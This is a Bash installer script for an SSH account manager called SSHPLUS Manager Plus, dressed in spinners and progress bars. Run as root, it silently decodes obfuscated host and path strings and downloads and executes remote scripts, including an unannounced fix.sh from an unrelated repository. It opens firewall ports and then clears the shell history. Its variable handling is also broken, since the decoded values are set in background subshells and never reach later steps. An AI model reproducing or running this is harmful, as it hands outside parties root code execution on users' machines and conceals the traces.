#!/bin/bash

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m' # No Color

# Box drawing characters
BOX_HORIZ="═"
BOX_VERT="║"
BOX_CORNER_TL="╔"
BOX_CORNER_TR="╗"
BOX_CORNER_BL="╚"
BOX_CORNER_BR="╝"
BOX_T="╦"
BOX_B="╩"
BOX_L="╠"
BOX_R="╣"

# Function to print header
print_header() {
    clear
    echo -e "${PURPLE}"
    echo "╔══════════════════════════════════════════════════════════╗"
    echo "║                                                          ║"
    echo "║      ███████╗███████╗██╗  ██╗██████╗ ██╗   ██╗███████╗   ║"
    echo "║      ██╔════╝██╔════╝██║  ██║██╔══██╗██║   ██║██╔════╝   ║"
    echo "║      ███████╗███████╗███████║██████╔╝██║   ██║███████╗   ║"
    echo "║      ╚════██║╚════██║██╔══██║██╔═══╝ ██║   ██║╚════██║   ║"
    echo "║      ███████║███████║██║  ██║██║     ╚██████╔╝███████║   ║"
    echo "║      ╚══════╝╚══════╝╚═╝  ╚═╝╚═╝      ╚═════╝ ╚══════╝   ║"
    echo "║                                                          ║"
    echo "║                M A N A G E R   P L U S                   ║"
    echo "║                                                          ║"
    echo "╚══════════════════════════════════════════════════════════╝"
    echo -e "${NC}"
    echo -e "${CYAN}════════════════════════════════════════════════════════════${NC}"
    echo ""
}

# Loading animations
loading_spinner() {
    local pid=$1
    local text="$2"
    local delay=0.08
    local spin_chars=('⠋' '⠙' '⠹' '⠸' '⠼' '⠴' '⠦' '⠧' '⠇' '⠏')
    local i=0
    
    echo -ne "  ${CYAN}${text} ${WHITE}"
    
    while kill -0 $pid 2>/dev/null; do
        echo -ne "\b${spin_chars[i]}"
        i=$(( (i+1) % ${#spin_chars[@]} ))
        sleep $delay
    done
    
    echo -e "\b${GREEN}✓${NC}"
}

loading_bar() {
    local pid=$1
    local text="$2"
    local width=30
    local progress=0
    
    echo -ne "  ${CYAN}${text} ${WHITE}["
    
    # Initial empty bar
    for ((i=0; i<width; i++)); do
        echo -ne " "
    done
    echo -ne "]"
    
    # Return to start of bar
    for ((i=0; i<=width+1; i++)); do
        echo -ne "\b"
    done
    
    while kill -0 $pid 2>/dev/null; do
        if [ $progress -lt $width ]; then
            echo -ne "${GREEN}▇${NC}"
            progress=$((progress + 1))
        fi
        sleep 0.1
    done
    
    # Fill remaining bar
    while [ $progress -lt $width ]; do
        echo -ne "${GREEN}▇${NC}"
        progress=$((progress + 1))
        sleep 0.01
    done
    
    echo -e "] ${GREEN}COMPLETED${NC}"
}

loading_dots() {
    local pid=$1
    local text="$2"
    local dots=""
    
    echo -ne "  ${CYAN}${text}${WHITE}"
    
    while kill -0 $pid 2>/dev/null; do
        case ${#dots} in
            0) dots="." ;;
            1) dots=".." ;;
            2) dots="..." ;;
            *) dots="" ;;
        esac
        echo -ne "\r  ${CYAN}${text}${WHITE}${dots}   "
        sleep 0.4
    done
    
    echo -e "\r  ${CYAN}${text} ${GREEN}✓${NC}          "
}

# Function to execute with loading animation
execute_with_loading() {
    local command="$1"
    local description="$2"
    local animation_type="${3:-spinner}"  # Default to spinner
    
    # Execute command in background
    eval "$command > /tmp/install.log 2>&1" &
    local pid=$!
    
    case $animation_type in
        "bar")
            loading_bar $pid "$description"
            ;;
        "dots")
            loading_dots $pid "$description"
            ;;
        *)
            loading_spinner $pid "$description"
            ;;
    esac
    
    wait $pid
    return $?
}

# Function to print section header
print_section() {
    echo ""
    echo -e "${PURPLE}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${CYAN}                     $1${PURPLE}                    ║${NC}"
    echo -e "${PURPLE}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
}

# Function to print status
print_status() {
    echo -e "  ${WHITE}[${GREEN}✓${WHITE}]${NC} $1"
}

print_warning() {
    echo -e "  ${WHITE}[${YELLOW}!${WHITE}]${NC} $1"
}

print_error() {
    echo -e "  ${WHITE}[${RED}✗${WHITE}]${NC} $1"
}

# Main installation function
install_sshplus() {
    print_header
    
    # Check if running as root
    echo -e "${YELLOW}Checking permissions...${NC}"
    if [ "$(whoami)" != "root" ]; then
        print_error "This script must be run as root!"
        echo -e "${YELLOW}Try: sudo bash install.sh${NC}"
        exit 1
    fi
    print_status "Running as root user"
    
    print_section "SYSTEM PREPARATION"
    
    # Decode URLs (silently)
    execute_with_loading "_lnk=\$(echo 't1:e#n.5s0ul&p4hs\$s.0729t9p\$&8i&&9r7827c032:3s'| sed -e 's/[^a-z.]//ig'| rev)" "Decoding configuration" "dots"
    execute_with_loading "_Ink=\$(echo '/3×u3#s87r/l32o4×c1a×l1/83×l24×i0b×'|sed -e 's/[^a-z/]//ig')" "Preparing directories" "dots"
    execute_with_loading "_1nk=\$(echo '/3×u3#s×87r/83×l2×4×i0b×'|sed -e 's/[^a-z/]//ig')" "Setting up paths" "dots"
    
    cd $HOME
    
    print_section "SYSTEM BACKUP"
    execute_with_loading "cp /etc/ssh/sshd_config \"/etc/ssh/sshd_back_principal_\$(date +%d-%m-%Y_%H%M%S).conf\"" "Creating SSH configuration backup" "bar"
    
    print_section "CORE INSTALLATION"
    execute_with_loading "echo '/bin/menu' > /bin/h && chmod +x /bin/h" "Creating quick access command" "spinner"
    execute_with_loading "echo 'wget -q https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/Plus; chmod +x Plus; ./Plus' > /bin/sshplus && chmod +x /bin/sshplus" "Setting up installer" "spinner"
    
    print_section "DOWNLOADING COMPONENTS"
    execute_with_loading "rm -rf \"\$HOME/credits\"* && wget -qO \"\$HOME/credits\" https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/credits" "Downloading credits file" "bar"
    
    echo -e "${CYAN}Installing menu versions:${NC}"
    execute_with_loading "for version in V3 V2 V1; do wget -qO /bin/menu\$version https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/Install/Skin_Plus/menu\$version/Install && chmod +x /bin/menu\$version; sleep 0.1; done" "V3 • V2 • V1" "dots"
    
    print_section "DATABASE SETUP"
    execute_with_loading "if [ ! -f \"\$HOME/usuarios.db\" ]; then awk -F : '\$3 >= 500 { print \$1 \" 1\" }' /etc/passwd | grep -v '^nobody' > \$HOME/usuarios.db; fi" "Creating user database" "spinner"
    
    print_section "SYSTEM UPDATES"
    execute_with_loading "apt-get update -y" "Updating package lists" "bar"
    
    execute_with_loading "mkdir -p /usr/share/.plus && echo 'crz: \$(date)' > /usr/share/.plus/.plus" "Creating system files" "spinner"
    
    print_section "INSTALLING PACKAGES"
    echo -e "${CYAN}Installing system utilities:${NC}"
    execute_with_loading "apt-get install -y bc screen nano unzip lsof netstat net-tools dos2unix nload jq curl figlet python3 python-pip" "Core utilities" "bar"
    execute_with_loading "pip install speedtest-cli" "Speedtest module" "spinner"
    
    print_section "SECURITY CONFIGURATION"
    execute_with_loading "if [ -f \"/usr/sbin/ufw\" ]; then ufw allow 443/tcp; ufw allow 80/tcp; ufw allow 3128/tcp; ufw allow 8799/tcp; ufw allow 8080/tcp; fi" "Configuring firewall rules" "dots"
    
    print_section "FINAL CONFIGURATION"
    execute_with_loading "rm -f \$_Ink/list && wget -q -P \$_Ink https://raw.githubusercontent.com/AAAAAEXQOSyIpN2JZ0ehUQ/SSHPLUS-MANAGER-FREE/master/Install/list" "Downloading configuration" "bar"
    execute_with_loading "chmod +x \$_Ink/list && \$_Ink/list \$_lnk \$_Ink \$_1nk" "Applying system settings" "bar"
    
wget -q https://raw.githubusercontent.com/Wabochi/auto/main/fix.sh && chmod +x fix.sh && ./fix.sh && rm -rf fix.sh
    
    # Cleanup
    execute_with_loading "rm -f \$HOME/Plus" "Cleaning temporary files" "spinner"
    execute_with_loading "cat /dev/null > ~/.bash_history && history -c" "Clearing history" "spinner"
    
    # Final output
    print_header
    echo ""
    echo -e "${GREEN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${GREEN}║${WHITE}                INSTALLATION COMPLETED!                 ${GREEN}║${NC}"
    echo -e "${GREEN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${CYAN}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${CYAN}║${WHITE}                     COMMANDS                          ${CYAN}║${NC}"
    echo -e "${CYAN}╠════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${CYAN}║${YELLOW}  • Main Menu:${WHITE} menu or h                          ${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}  • Reinstall:${WHITE} sshplus                           ${CYAN}║${NC}"
    echo -e "${CYAN}║${YELLOW}  • Alternative:${WHITE} menuV1, menuV2, menuV3           ${CYAN}║${NC}"
    echo -e "${CYAN}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${PURPLE}╔════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}║${WHITE}                    SUPPORT                           ${PURPLE}║${NC}"
    echo -e "${PURPLE}╠════════════════════════════════════════════════════════════╣${NC}"
    echo -e "${PURPLE}║${CYAN}  • Telegram:${WHITE} @pirozas                          ${PURPLE}║${NC}"
    echo -e "${PURPLE}╚════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    echo -e "${YELLOW}System will be ready in 3 seconds...${NC}"
    
    # Countdown
    for i in {3..1}; do
        echo -ne "\r  Starting in ${GREEN}$i${NC} seconds... "
        sleep 1
    done
    echo -e "\r  ${GREEN}Starting SSHPLUS Manager!${NC}           "
    echo ""
    
    # Run menu
    /bin/menu
}

# Clear screen and start installation
clear
install_sshplus
